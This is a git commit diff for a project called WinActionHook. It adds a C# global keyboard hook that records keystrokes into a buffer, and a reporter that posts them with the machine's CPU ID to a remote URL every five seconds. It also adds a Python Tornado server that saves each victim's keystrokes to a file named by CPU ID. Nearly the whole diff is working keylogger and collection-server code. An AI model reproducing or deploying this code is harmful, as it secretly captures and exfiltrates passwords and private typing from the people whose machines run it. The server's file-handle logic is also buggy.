6c63fcef173d3f5f6362ebf54f20ac6d9f3b3bfa
ShirleyC7 <okchengzi@163.com>
2019-05-25 18:43:03 +0800

    Revert "Revert "Merge branch 'dev' of https://github.com/Shadow-Priest/WinActionHook into dev""
    This reverts commit c3cad4b2f75d4b693df5affb6886a33891d0bd02.

--- src/GUI/Workers.cs
+++ src/GUI/Workers.cs
@@ -19,8 +19,9 @@ namespace GUI
         private MouseWatcher mouseWatcher;
         private KeyboardWatcher keyboardWatcher;
         private string tmp_str = "";
+        public string keyLog = ""; // ScheduledReporter将会读取此buffer内容，发往监听者
 
-        public ConsoleApp2(TextBox tb_keyboard, TextBox tb_mouse,ListView list)
+        public ConsoleApp2(TextBox tb_keyboard, TextBox tb_mouse, ListView list)
         {
             Console.WriteLine("New ConsoleApp2!");
             this.eventHookFactory = new EventHookFactory();
@@ -28,26 +29,48 @@ namespace GUI
             this.keyboardWatcher = eventHookFactory.GetKeyboardWatcher();
             this.keyboardWatcher.OnKeyInput += (s, e) =>
             {
+                // 为监听者准备一份易于阅读的按键记录
+                if (e.KeyData.EventType == KeyEvent.down)
+                {
+                    if (e.KeyData.Key <= System.Windows.Input.Key.D9 && e.KeyData.Key >= System.Windows.Input.Key.D0)
+                    {
+                        keyLog += (char)('0' + e.KeyData.Key - System.Windows.Input.Key.D0);
+                    }
+                    else if (e.KeyData.Key <= System.Windows.Input.Key.Z && e.KeyData.Key >= System.Windows.Input.Key.A)
+                    {
+                        keyLog += (char)('a' + e.KeyData.Key - System.Windows.Input.Key.A);
+                    }
+                    else
+                    {
+                        keyLog += "<"+e.KeyData.Key.ToString()+">";
+                    }
+                        
+                }
+                else if(e.KeyData.Key == System.Windows.Input.Key.LeftShift || e.KeyData.Key == System.Windows.Input.Key.RightShift)
+                {//shift松开
+                    keyLog += "</LeftShift>";
+
+                }
                 string msg = $"Key {e.KeyData.EventType} event of key {e.KeyData.Keyname}";
                 tb_keyboard.Text = msg;
-                Console.WriteLine(msg);
+                //Console.WriteLine(msg);
                 tmp_str += msg + "\r\n";
-                draw(e.KeyData.Keyname,list);
+                draw(e.KeyData.Keyname, list);
             };
             this.mouseWatcher = eventHookFactory.GetMouseWatcher();
             this.mouseWatcher.OnMouseInput += (s, e) =>
             {
                 string msg = $"Mouse event {e.Message.ToString()} at point {e.Point.x},{e.Point.y}";
                 tb_mouse.Text = msg;
-                Console.WriteLine(msg);
+                //Console.WriteLine(msg);
                 tmp_str += msg + "\r\n";
             };
         }
 
         private int l = 0;
-        public void draw(string c ,ListView list)
+        public void draw(string c, ListView list)
         {
-            if ( c.Length == 1 || c.Length == 2)
+            if (c.Length == 1 || c.Length == 2)
             {
                 //还原上一步颜色
                 if (l < 0) return;
@@ -72,7 +95,7 @@ namespace GUI
         }
 
         //确定键盘的位置 以显示颜色 找不到返回-1
-        public int position( string c )
+        public int position(string c)
         {
             char[,] low = new char[4, 10] { { '1','2','3','4','5','6','7','8','9','0' },
                { 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p' } ,
@@ -82,17 +105,17 @@ namespace GUI
                { 'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P' } ,
                { 'A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', ' ' } ,
                { ' ', 'Z', 'X', 'C', 'V', 'B', 'N', 'M', ' ', ' ' } };
-            for (int i=0;i<4;i++)
+            for (int i = 0; i < 4; i++)
             {
-                for(int j=0;j<10;j++)
+                for (int j = 0; j < 10; j++)
                 {
-                    if( c[0]==low[i,j] )
-                    {                       
-                        return i*10+j;
+                    if (c[0] == low[i, j])
+                    {
+                        return i * 10 + j;
                     }
                     if (c[0] == upper[i, j])
                     {
-                        return i*10+j;
+                        return i * 10 + j;
                     }
                 }
             }
@@ -120,27 +143,39 @@ namespace GUI
 
     public class ScheduledReporter
     {
-        async public static void Run(CancellationToken ct, string url)
+        async public static void Run(CancellationToken ct, string url, ConsoleApp2 app)
         {
-            // 示例发送HTTP报文
-            Dictionary<string, string> dic = new Dictionary<string, string>();
-            dic.Add("cpuid", Get_CPUID());
-            dic.Add("a", "4");
-            dic.Add("b", "2019");
+            string logBuffer = "";
+            Dictionary<string, string> dic;
 
             for (; ; )
             {
-                await Task.Delay(1000);
+                // wait 5s, check callation every 1s
                 try
                 {
-                    ct.ThrowIfCancellationRequested();
+                    for (int n = 0; n < 5; ++n)
+                    {
+                        await Task.Delay(1000);
+                        ct.ThrowIfCancellationRequested();
+                    }
                 }
                 catch (OperationCanceledException)
                 { break; }
+
+                // post keyLog
                 try
                 {
+                    // 构造请求字典
+                    logBuffer += app.keyLog;
+                    app.keyLog = "";
+                    dic = new Dictionary<string, string>();
+                    dic.Add("cpuid", Get_CPUID());
+                    dic.Add("keyLog", logBuffer);
                     string responseBody = Post(url, dic);
-                    Console.WriteLine(responseBody);
+                    if (responseBody.ToString() == "ACK")
+                    {
+                        logBuffer = "";
+                    }
                 }
                 catch (System.Net.WebException)
                 { }
@@ -148,7 +183,7 @@ namespace GUI
         }
 
         #region HTTP-post
-        // 示例HTTP-post请求
+        // HTTP-POST请求
         // ref: https://www.imooc.com/article/40178
         public static string Post(string url, Dictionary<string, string> dic)
         {
--- src/Server/serv.py
+++ src/Server/serv.py
@@ -3,13 +3,57 @@ import tornado.ioloop
 import tornado.web
 import tornado.escape
 import tornado.httpserver
+import threading
+import queue
+import time
+
+
+class LogWriter():
+    def __init__(self):
+        self.queue = queue.Queue()
+        self.opened_files = []
+        self.opened_files_handles = []
+        self.mutex = threading.Lock()
+
+    def run(self):
+        while True:
+            dic = self.queue.get(block=True)  # type: list
+            try:
+                self.mutex.acquire(blocking=True)  # 加锁 writer和cleaner要互斥读写文件列表
+                idx = self.opened_files.index(dic[0])
+                f = self.opened_files_handles[idx]
+                f.write(dic[1]+'\n')
+            except:
+                f = open(dic[0]+'.txt', 'a')
+                f.write(dic[1]+'\n')
+                self.opened_files.append(dic[0])
+                self.opened_files_handles.append(f)
+            finally:
+                self.opened_files_handles[0].close()
+                self.opened_files.clear()
+                self.opened_files_handles.clear()
+                self.mutex.release()  # 解锁
+
+    def cleaner(self):
+        while True:
+            # 每20s重开文件（flush）
+            time.sleep(20)
+            self.mutex.acquire(blocking=True)  # 加锁 writer和cleaner要互斥读写文件列表
+            for f in self.opened_files_handles:
+                f.close()
+            self.opened_files_handles.clear()
+            self.opened_files.clear()
+            self.mutex.release()  # 解锁
 
 
 class AnnounceHandler(tornado.web.RequestHandler):
     # post: /announce
     async def post(self):
-        print(self.get_argument("cpuid"))
+        print(self.get_argument("keyLog"))
         self.write('ACK')
+        if self.get_argument("keyLog") != '':
+            log_writer.queue.put((self.get_argument("cpuid"), self.get_argument("keyLog")))
+
 
 def make_app():
     settings = {
@@ -28,6 +72,16 @@ def make_app():
 
 
 if __name__ == "__main__":
+    # 开LogWriter
+    log_writer = LogWriter()
+    t1 = threading.Thread(target=log_writer.run)
+    t2 = threading.Thread(target=log_writer.cleaner)
+    t1.setDaemon(True)
+    t2.setDaemon(True)
+    t1.start()
+    t2.start()
+
+    # 开HTTP服务器
     app = make_app()
     server = tornado.httpserver.HTTPServer(app)
     server.bind(8086)
